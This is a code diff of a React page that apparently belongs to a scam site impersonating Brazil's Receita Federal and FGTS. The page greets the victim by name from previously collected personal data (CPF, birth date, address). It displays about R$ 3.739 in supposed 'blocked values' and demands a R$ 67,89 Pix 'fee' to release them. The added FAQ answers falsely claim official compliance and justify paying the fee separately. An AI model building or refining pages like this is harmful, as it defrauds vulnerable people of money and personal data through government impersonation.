@@ -4,46 +4,87 @@ import logofgts from "../assets/fgts2.png";
 import { IoIosWarning } from "react-icons/io";
 import { HiChevronRight } from "react-icons/hi";
 import { Helmet } from "react-helmet";
+import { UserData } from "../types/userData";
+import pix from "../assets/pix.png"
 
 export function PagamentoTarifa() {
+
+    const [userData, setUserData] = useState<UserData>({
+        nome: "",
+        cpf: "",
+        dataNascimento: "",
+        email: "",
+        cep: "",
+        cidade: "",
+        estado: "",
+        rua: "",
+        numero: ""
+    });
+
+    // Carregar os dados do localStorage ao montar o componente
+    useEffect(() => {
+        const storedUserData = localStorage.getItem("userData");
+        if (storedUserData) {
+            setUserData(JSON.parse(storedUserData));
+        }
+    }, []);
+
     useEffect(() => {
         document.title = "Pagamento da Tarifa - Receita Federal";
     }, []);
 
     const [activeIndex, setActiveIndex] = useState<number | null>(null);
     const [displayedAmount, setDisplayedAmount] = useState(0);
-    const totalAmount = 3387.51; // Valor total
+    const totalAmount = 3739.70; // Valor total
 
     // Função para alternar perguntas
     const toggleQuestion = (index: number) => {
         setActiveIndex(activeIndex === index ? null : index);
     };
 
-    // Perguntas frequentes
     const questions = [
-        "Por que é cobrado uma taxa de R$ 67,89?",
-        "Por que vocês não descontam a taxa do meu saque?",
-        "Quais são as formas de pagamento?",
-        "Como faço para sacar rápido sem esperar as 2 horas?",
-        "Qual a garantia que tenho para efetuar o saque dos valores bloqueados?",
-        "Como posso acompanhar meu pedido de saque?",
+        {
+            question: "Por que é cobrado uma taxa de R$ 67,89?",
+            answer: "A taxa de R$ 67,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável."
+        },
+        {
+            question: "Por que vocês não descontam a taxa do meu saque?",
+            answer: "Descontar a taxa do saque não é viável devido às políticas financeiras que regem essas transações. Ao manter a taxa separada, asseguramos que o valor total do seu saque permaneça intacto até que você opte por efetuar o pagamento, permitindo mais controle sobre seus recursos."
+        },
+        {
+            question: "Quais são as formas de pagamento?",
+            answer: "Oferecemos diversas opções de pagamento para facilitar sua experiência, incluindo cartões de crédito, débito e transferências bancárias. Assim, você pode escolher a forma que melhor se adapta às suas necessidades e garantir que seu saque seja liberado rapidamente."
+        },
+        {
+            question: "Como faço para sacar rápido sem esperar as 2 horas?",
+            answer: "Para garantir que seu saque seja processado rapidamente, recomendamos que você realize o pagamento da tarifa o mais rápido possível. Assim que o pagamento for confirmado, seu saque será priorizado, permitindo que você receba os fundos em um prazo muito mais curto."
+        },
+        {
+            question: "Qual a garantia que tenho para efetuar o saque dos valores bloqueados?",
+            answer: "A segurança é a nossa prioridade. Todos os processos são realizados dentro das diretrizes da Receita Federal, garantindo que seus valores bloqueados sejam liberados com segurança e em conformidade com as leis vigentes. Você pode confiar que estamos aqui para proteger seus interesses."
+        },
+        {
+            question: "Como posso acompanhar meu pedido de saque?",
+            answer: "Você pode acompanhar seu pedido de saque através do nosso portal. Assim que seu pedido for processado, você receberá atualizações em tempo real sobre o status da sua transação, garantindo que você esteja sempre informado sobre o que está acontecendo com seus fundos."
+        }
     ];
 
     // Animação do valor
     useEffect(() => {
         let start = 0;
         const end = totalAmount;
-        const duration = 10000; // Duração da animação em milissegundos
-        const incrementTime = duration / end; // Tempo para cada incremento
+        const duration = 3000; // Duração da animação em milissegundos (3 segundos)
+        const increment = Math.ceil(end / (duration / 100)); // Incremento de valor a cada 100 ms
 
         const intervalId = setInterval(() => {
             if (start < end) {
-                start++;
+                start += increment;
+                if (start > end) start = end; // Evitar ultrapassar o valor total
                 setDisplayedAmount(start);
             } else {
                 clearInterval(intervalId);
             }
-        }, incrementTime);
+        }, 100); // Atualiza a cada 100 ms
 
         return () => clearInterval(intervalId);
     }, [totalAmount]);
@@ -55,7 +96,7 @@ export function PagamentoTarifa() {
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={logo} alt="logo" />
-                        <span className="text-white font-extralight">Olá, VICTOR</span>
+                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                     </div>
                     <img src={logofgts} alt="fgts" width={65} />
                 </div>
@@ -92,7 +133,10 @@ export function PagamentoTarifa() {
                         </h3>
                         <p className="text-gray-600">Pague hoje com desconto de:</p>
                         <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por apenas: </p>
-                        <p className="text-3xl font-extrabold text-green-700">R$ 67,89</p>
+                        <div className="flex justify-center space-x-6">
+                            <img src={pix} alt="pic" width={100} />
+                            <p className="text-3xl font-extrabold text-green-700">R$ 67,89</p>
+                        </div>
                     </div>
 
                     <p className="text-gray-600 text-center mt-4">
@@ -115,13 +159,13 @@ export function PagamentoTarifa() {
                     </div>
                     <h4 className="text-lg font-semibold text-gray-800 mt-4">DÚVIDAS FREQUENTES</h4>
                     <div className="w-full">
-                        {questions.map((question, index) => (
+                        {questions.map((item, index) => (
                             <div key={index} className="border-b">
                                 <button
                                     className="flex justify-between w-full text-left py-2 text-gray-700 hover:text-gray-900 focus:outline-none"
                                     onClick={() => toggleQuestion(index)}
                                 >
-                                    <h5 className="font-semibold">{question}</h5>
+                                    <h5 className="font-semibold">{item.question}</h5>
                                     <HiChevronRight
                                         className={`transform transition-transform duration-300 ${activeIndex === index ? 'rotate-90' : ''}`}
                                         size={24}
@@ -131,17 +175,12 @@ export function PagamentoTarifa() {
                                     className={`overflow-hidden transition-all duration-300 ${activeIndex === index ? 'max-h-40' : 'max-h-0'}`}
                                 >
                                     <p className="text-gray-600 text-sm mb-2 p-2">
-                                        Esta é a resposta à pergunta: "{question}".
+                                        {item.answer}
                                     </p>
                                 </div>
                             </div>
                         ))}
-
                     </div>
-
-                    <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
-                        Realizar Pagamento
-                    </button>
                 </div>
             </div>
         </div>
